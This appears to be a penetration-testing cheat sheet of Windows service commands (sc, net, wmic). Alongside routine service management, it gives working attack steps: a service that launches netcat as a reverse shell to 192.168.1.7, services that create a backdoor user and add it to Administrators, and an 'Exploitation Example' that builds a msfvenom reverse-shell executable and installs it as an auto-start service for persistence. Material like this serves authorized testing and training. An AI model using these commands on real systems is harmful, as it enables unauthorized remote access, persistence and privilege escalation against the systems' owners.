# Service-Controller-Utility-Commands

## Querying Services

#### Display Information About a Specified Service
```powershell
sc query
```

#### Display Extended Information About a Service
```powershell
sc queryex type= service
```

#### Display Services of Type 'Service'
```powershell
sc query type= service
```

#### Find Specific Service States
```powershell
sc query find "STATE"
```

#### Find a Specific Service by Name
```powershell
sc query | find "Telnet"
```

#### Query a Specific Service
```powershell
sc query LanmanServer
```

---

# Service Configuration

#### Display the Configuration of a Service
```powershell
sc qc Audiosrv
```

#### Stop a Service
```powershell
sc stop Audiosrv
```

#### Start a Service
```powershell
sc start Audiosrv
```

#### Pause a Service
```powershell
sc pause Audiosrv
```

#### Resume a Paused Service
```powershell
sc continue Audiosrv
```

#### Configure Service Startup and Login Accounts
```powershell
sc config Audiosrv
```

---

# Creating and Managing Services

#### Create a New Service
```powershell
sc create nc binPath= "C:\Windows\System32\nc64.exe"
```

#### Query the Configuration of a Created Service
```powershell
sc qc nc
```

#### Query the Status of a Created Service
```powershell
sc query nc
```

#### Start the Created Service
```powershell
sc start nc
```

#### Delete a Service
```powershell
sc delete nc
```

#### Configure a Service to Run a Specific Command
```powershell
sc config nc binPath= "C:\Windows\nc64.exe 192.168.1.7 4444 -e cmd.exe"
```

#### Create a Service to Send ICMP Packets
```powershell
sc create pingme binPath= "ping 192.168.1.6"
```

#### Start the ICMP Service
```powershell
sc start pingme
```

#### Create a User Creation Service
```powershell
sc create useradd binPath="net user u1 @rmour123 /add"
```

#### Start the User Creation Service
```powershell
sc start useradd
```

#### Configure a Service to Add a User to Administrators Group
```powershell
sc config useradd binpath= "net localgroup administrators u1 /add"
```

#### Start the Privilege Elevation Service
```powershell
sc start useradd
```

---

# Exploitation Example

#### Generate a Reverse Shell Executable Using msfvenom
```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.6 LPORT=4455 -f exe > shell.exe
```

#### Configure a Service to Execute the Shell
```powershell
sc create msfvenom_shell binPath= "C:\Windows\Temp\shell.exe"
```

#### Change a Service's Startup Type
```powershell
sc config msfvenom_shell start=auto
```
- **auto** - Automatic Startup
- **demand** - Manual Startup
- **disabled** - Disabled

#### Restart the System Immediately
```powershell
shutdown /r /t 0 /f
```

---

# Service Management Using `net`

#### Start a Service Using `net`
```powershell
net start TlntSvr
```

#### Stop a Service Using `net`
```powershell
net stop TlntSvr
```

#### Pause a Service Using `net`
```powershell
net pause TlntSvr
```

#### Resume a Paused Service Using `net`
```powershell
net continue TlntSvr
```

---

# Using `wmic` to Manage Services

#### List All Services with Details
```powershell
wmic service get name, displayname, pathname, startmode
```

#### List All Auto-Start Services
```powershell
wmic service get name, displayname, pathname, startmode | findstr /i "auto"
```

#### List All Auto-Start Services Excluding Those in C:\Windows
```powershell
wmic service get name, displayname, pathname, startmode | findstr /i "auto" | findstr /i/v "c:\windows"
```

---

# Additional Resources

#### ServiceSecurityEditor

ServiceSecurityEditor is used to maintain and manage services, allowing manual configuration of permissions for users.

[Download ServiceSecurityEditor](https://www.coretechnologies.com/products/ServiceSecurityEditor/)

#### After Download
1. Run the application.
2. Select the service you want to configure.
3. Click "Open".
4. Add a user.
5. Select the user and set the required permissions.
6. Click "Apply" and then "OK".
